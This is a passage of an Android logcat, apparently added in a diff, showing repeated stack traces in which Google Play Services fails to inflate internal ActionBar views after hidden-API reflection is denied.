+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:850)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:544)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:462)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:413)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.DecorView.onResourcesLoaded(DecorView.java:1814)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.generateLayout(PhoneWindow.java:2871)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.installDecor(PhoneWindow.java:2934)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.getDecorView(PhoneWindow.java:2267)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityTransitionState.setEnterSceneTransitionInfo(ActivityTransitionState.java:175)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9350)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Caused by: java.lang.NoSuchMethodException: com.android.internal.widget.ActionBarOverlayLayout.<init> [class android.content.Context, interface android.util.AttributeSet]
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor0(Class.java:3387)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor(Class.java:2479)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):57)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	... 34 more
+09-04 07:18:26.252 15172 15172 E .android.gms.ui: hiddenapi: Accessing hidden method Lcom/android/internal/widget/ActionBarOverlayLayout;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V (runtime_flags=0, domain=platform, api=max-target-r) from Lacii; (domain=app, TargetSdkVersion=37) using reflection: denied
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Error attempting to create  view
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: android.view.InflateException: Binary XML file line #21: Error inflating class com.android.internal.widget.ActionBarOverlayLayout
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):180)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):32)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):8)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):6)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):6)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):15)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.onCreateView(Activity.java:8378)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):26)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):3)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.tryCreateView(LayoutInflater.java:958)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:886)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:850)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:544)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:462)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:413)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.DecorView.onResourcesLoaded(DecorView.java:1814)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.generateLayout(PhoneWindow.java:2871)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.installDecor(PhoneWindow.java:2934)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.getDecorView(PhoneWindow.java:2267)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityTransitionState.setEnterSceneTransitionInfo(ActivityTransitionState.java:175)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9350)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Caused by: java.lang.NoSuchMethodException: com.android.internal.widget.ActionBarOverlayLayout.<init> [class android.content.Context, interface android.util.AttributeSet]
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor0(Class.java:3387)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor(Class.java:2479)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):57)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	... 41 more
+09-04 07:18:26.252 15172 15172 E .android.gms.ui: hiddenapi: Accessing hidden method Lcom/android/internal/widget/ActionBarContainer;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V (runtime_flags=0, domain=platform, api=blocked) from Lacii; (domain=app, TargetSdkVersion=37) using reflection: denied
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Error attempting to create  view
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: android.view.InflateException: Binary XML file line #31: Error inflating class com.android.internal.widget.ActionBarContainer
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):180)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):20)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):3)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.tryCreateView(LayoutInflater.java:958)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:886)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:850)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflate(LayoutInflater.java:1012)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflateChildren(LayoutInflater.java:973)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:571)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:462)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:413)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.DecorView.onResourcesLoaded(DecorView.java:1814)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.generateLayout(PhoneWindow.java:2871)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.installDecor(PhoneWindow.java:2934)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.getDecorView(PhoneWindow.java:2267)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityTransitionState.setEnterSceneTransitionInfo(ActivityTransitionState.java:175)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9350)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Caused by: java.lang.NoSuchMethodException: com.android.internal.widget.ActionBarContainer.<init> [class android.content.Context, interface android.util.AttributeSet]
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor0(Class.java:3387)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor(Class.java:2479)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):57)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	... 36 more
+09-04 07:18:26.252 15172 15172 E .android.gms.ui: hiddenapi: Accessing hidden method Lcom/android/internal/widget/ActionBarContainer;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V (runtime_flags=0, domain=platform, api=blocked) from Lacii; (domain=app, TargetSdkVersion=37) using reflection: denied
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Error attempting to create  view
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: android.view.InflateException: Binary XML file line #31: Error inflating class com.android.internal.widget.ActionBarContainer
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):180)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):32)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):8)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):6)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):6)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):15)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.onCreateView(Activity.java:8378)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):26)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):3)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.tryCreateView(LayoutInflater.java:958)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:886)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:850)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflate(LayoutInflater.java:1012)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflateChildren(LayoutInflater.java:973)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:571)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:462)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:413)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.DecorView.onResourcesLoaded(DecorView.java:1814)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.generateLayout(PhoneWindow.java:2871)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.installDecor(PhoneWindow.java:2934)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.getDecorView(PhoneWindow.java:2267)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityTransitionState.setEnterSceneTransitionInfo(ActivityTransitionState.java:175)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9350)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Caused by: java.lang.NoSuchMethodException: com.android.internal.widget.ActionBarContainer.<init> [class android.content.Context, interface android.util.AttributeSet]
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor0(Class.java:3387)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor(Class.java:2479)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):57)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	... 43 more
+09-04 07:18:26.253 15172 15172 E .android.gms.ui: hiddenapi: Accessing hidden method Lcom/android/internal/widget/ActionBarContextView;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V (runtime_flags=0, domain=platform, api=max-target-r) from Lacii; (domain=app, TargetSdkVersion=37) using reflection: denied
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: Error attempting to create  view
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: android.view.InflateException: Binary XML file line #47: Error inflating class com.android.internal.widget.ActionBarContextView
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):180)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):20)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):3)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.tryCreateView(LayoutInflater.java:958)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:886)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:850)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflate(LayoutInflater.java:1012)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflateChildren(LayoutInflater.java:973)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflate(LayoutInflater.java:1016)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflateChildren(LayoutInflater.java:973)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:571)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:462)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:413)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.DecorView.onResourcesLoaded(DecorView.java:1814)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.generateLayout(PhoneWindow.java:2871)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.installDecor(PhoneWindow.java:2934)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.getDecorView(PhoneWindow.java:2267)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityTransitionState.setEnterSceneTransitionInfo(ActivityTransitionState.java:175)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9350)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loopOnce(Looper.java:296)
